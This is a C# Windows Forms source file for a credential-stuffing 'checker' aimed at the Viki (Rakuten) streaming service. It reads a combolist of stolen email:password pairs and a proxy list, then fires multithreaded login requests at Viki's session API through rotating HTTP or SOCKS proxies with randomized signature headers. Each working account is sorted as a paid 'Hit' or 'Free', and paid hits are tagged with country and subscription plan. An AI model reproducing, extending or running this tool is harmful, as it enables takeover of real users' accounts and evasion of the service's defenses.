using Parsing;
using Request;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using VikiRakuten.Funciones;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.TrackBar;

namespace VikiRakuten
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();


           
        }

        private void iconcerrar_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void iconminimizar_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
            string v = Import.GetUtils("Combolist");

            if (string.IsNullOrEmpty(v))
            {
                MessageBox.Show("No selecciono ningun combo", "Error");
            }
            else
            {
                foreach (string r in File.ReadAllLines(v))
                {
                    bool flag = r.Contains(":");

                    if (flag)
                    {
                        Variables.cooque.Enqueue(r);
                    }
                }

                label5.Text = Variables.cooque.Count().ToString();
            }
        }

            


        private void guna2Button2_Click(object sender, EventArgs e)
        {

            string v = Import.GetUtils("Proxylist");

            if (string.IsNullOrEmpty(v))
            {
                MessageBox.Show("No selecciono ningun Proxy", "Error");
            }
            else
            {
                foreach (string r in File.ReadAllLines(v))
                {
                    bool flag = r.Contains(":");

                    if (flag)
                    {
                        Variables.proxys.Add(r);
                    }
                }


                label6.Text = Variables.proxys.Count().ToString();
            }
        }

        private void guna2TrackBar1_Scroll(object sender, ScrollEventArgs e)
        {
            label4.Text = guna2TrackBar1.Value.ToString();
        }

        private void guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
        {
            Variables.proxyType = ProxyType.Http;
        }

        private void guna2CheckBox4_CheckedChanged(object sender, EventArgs e)
        {
            Variables.proxyType = ProxyType.Socks5;
        }

        private void guna2CheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            Variables.proxyType = ProxyType.Socks4;
        }

        private void guna2CheckBox3_CheckedChanged(object sender, EventArgs e)
        {
            Variables.proxyType = ProxyType.No;
        }

        private async Task Checking(int tasknum)
        {

            while (true)
            {
                if (Variables.cooque.Count <= 0)
                {
                    break;
                }


                string text;
                Variables.cooque.TryDequeue(out text);
                string[] array = text.Split(new char[]
                {
                    ':'
                });

                string proxyData = string.Empty;


                if (Variables.proxyType != ProxyType.No)
                {
                    Random rn = new Random();
                    proxyData = Variables.proxys[rn.Next(Variables.proxys.Count)];
                }

                try
                {

                    string ran = RandomString("?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h");


                    Dictionary<string, string> headers = new Dictionary<string, string>()
            {
            { "timestamp", DateTime.Now.ToString("yyyy-MM-dd:HH-mm-ss") },
            { "Accept-Language", "es" },
            { "Cache-Control", "no-cache" },
            { "signature", ran },
            { "Host", "api.viki.io" },
            { "Connection", "Keep-Alive" },
            { "Accept-Encoding", "gzip" },
            { "User-Agent", "okhttp/4.10.0" }
            };


                    var Recived = Request.Request.SendRequest("https://api.viki.io/v5/sessions.json?app=100531a", "POST",
                        "{\"user\":{\"source_platform\":\"android\",\"source_device\":\"A5010\",\"source_partner\":\"viki\",\"registration_method\":\"standard\"},\"source\":{\"platform\":\"android\",\"device\":\"A5010\",\"partner\":\"viki\",\"method\":\"standard\"},\"username\":\"<USER>\",\"password\":\"<PASS>\"}",
                        "application/json", headers, array[0], array[1], Variables.proxyType, proxyData).Content;



                    if (Recived.ToString().Contains("token"))
                    {
                        string country = Parse.JSON(Recived.ToString(), "country").FirstOrDefault<string>();
                        string subscriptions = Parse.JSON(Recived.ToString(), "user.subscriptions[0]", false, true).FirstOrDefault<string>(); 
                        string plan = PlanEditar(subscriptions);
                        string capture = "Country: " + country + " Plan: " + plan;
                         


                        if (Recived.ToString().Contains("subscriber\":true"))
                        { 
                            Variables.Hits++;
                            await Update();
                            await Agregar(array[0], array[1], capture, "Hit");
                        }
                        else if (Recived.ToString().Contains("subscriber\":false"))
                        {

                             
                            Variables.Freee++;
                            await Update();
                            await Agregar(array[0], array[1], capture, "Free");
                        }

                    }
                    else if (Recived.ToString().Contains("Invalid username or password"))
                    {
                        
                        Variables.invalid++; 
                        await Update();
                        
                    }
                    else
                    {
                        Variables.retrys++;
                        Variables.cooque.Enqueue(array[0] + ":" + array[1]);
                        await Update();
                    }
                }
                catch
                {
                    Variables.retrys++;
                    Variables.cooque.Enqueue(array[0] + ":" + array[1]);
                    await Update();
                }

            }

        }



        public static string PlanEditar(string content)
        {

            string plan = "null";

            Dictionary<string, string> vikiPassDictionary = new Dictionary<string, string>
        {
            { "21p", "VikiPass Estandar (Mensual)" },
            { "22p", "VikiPass Estandar (Anual)" },
            { "23p", "VikiPass Estandar (Mensual/Itunes)" },
            { "24p", "VikiPass Estandar (Anual/Itunes)" },
            { "25p", "VikiPass Estandar (Anual/GooglePlay)" },
            { "28p", "VikiPass Plus (Anual)" },
            { "29p", "VikiPass Plus (Mensual)" },
            { "33p", "VikiPass Plus (Mensual/GooglePlay)" },
            { "34p", "VikiPass Basico (Anual)" },
            { "37p", "VikiPass Plus (Mensual/Itunes)" },
            { "39p", "VikiPass Plus (Mensual/GooglePlay)" },
            { "44p", "VikiPass Estandar (Anual/GooglePlay)" },
            { "45p", "VikiPass Estandar (Mensual/GooglePlay)" },
            { "58p", "VikiPass Plus (Mensual/Roku)" },
            { "59p", "VikiPass Plus (Anual/Roku)" },
            { "61p", "VikiPass Plus (Mensual/Roku)" },
            { "5p", "VikiPass Estandar (Mensual)" },
            { "2p", "VikiPass Basico (Mensual/Itunes)" },
            { "51p", "VikiPass Plus (Anual/Itunes)" },
            { "36p", "VikiPass Plus (Anual/Itunes)" },
            { "31p", "VikiPass Basico (Mensual)" }
        };
            foreach (var kvp in vikiPassDictionary)
            {
                if (content == kvp.Key)
                {
                    plan = kvp.Value;
                }
            }
            return plan;
        }

        public static string RandomString(string Randomize)
        {
            string text = "";
            string text2 = "123456789abcdefghijklmnopqrstuvwxyz";
            string text3 = "abcdefghijklmnopqrstuvwxyz";
            string text4 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
            string text5 = "1234567890";
            string text6 = "!@#$%^&*()_+";
            string text7 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            string text8 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            Random random = new Random();
            for (int i = 0; i < Randomize.Length - 1; i++)
            {
                if ((Randomize[i].ToString() + Randomize[i + 1].ToString()).Equals("?h"))
                {
                    text += text2[random.Next(0, text2.Length)].ToString();
                }
                else if ((Randomize[i].ToString() + Randomize[i + 1].ToString()).Equals("?l"))
                {
                    text += text3[random.Next(0, text3.Length)].ToString();
                }
                else if ((Randomize[i].ToString() + Randomize[i + 1].ToString()).Equals("?u"))
                {
                    text += text4[random.Next(0, text4.Length)].ToString();
                }
                else if ((Randomize[i].ToString() + Randomize[i + 1].ToString()).Equals("?d"))
                {
                    text += text5[random.Next(0, text5.Length)].ToString();
                }
                else if ((Randomize[i].ToString() + Randomize[i + 1].ToString()).Equals("?m"))
                {
                    text += text7[random.Next(0, text7.Length)].ToString();
                }
                else if ((Randomize[i].ToString() + Randomize[i + 1].ToString()).Equals("?i"))
                {
                    text += text8[random.Next(0, text8.Length)].ToString();
                }
                else if ((Randomize[i].ToString() + Randomize[i + 1].ToString()).Equals("?s"))
                {
                    text += text6[random.Next(0, text6.Length)].ToString();
                }

                else if (Randomize[i].ToString().Contains("-"))
                {
                    text += "-";
                }
                else if (Randomize[i - 1].ToString().Equals("-") && !Randomize[i].ToString().Equals("?"))
                {
                    text += Randomize[i].ToString();
                }
            }
            return text;
        }
        private async Task Agregar(string email, string password, string capture, string tipo)
        {
            dataGridView1.Invoke((MethodInvoker)(() => dataGridView1.Rows.Add(email, password, capture, tipo)));
        }

        private async Task Update()
        {
            label12.Invoke((MethodInvoker)(() => label12.Text = Variables.Hits.ToString()));
            label13.Invoke((MethodInvoker)(() => label13.Text = Variables.Freee.ToString()));
            label14.Invoke((MethodInvoker)(() => label14.Text = Variables.retrys.ToString()));
            label15.Invoke((MethodInvoker)(() => label15.Text = Variables.invalid.ToString()));
        }

        private async void guna2Button3_Click(object sender, EventArgs e)
        {

             
            var semaphore = new SemaphoreSlim(Convert.ToInt32(label4.Text));

 

            for (int i = 0; i < Convert.ToInt32(label4.Text); i++)
            {
                int taskNumber = i;

                await semaphore.WaitAsync();

                Variables.tasks.Add(Task.Run(async () =>
                {
                    try
                    {
                        await Checking(taskNumber);
                    }   
                    finally
                    {
                        semaphore.Release();
                    }
                }));
            }

            await Task.WhenAll(Variables.tasks);
        }

        private void guna2ProgressBar1_ValueChanged(object sender, EventArgs e)
        {

        }

        private void panel2_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}
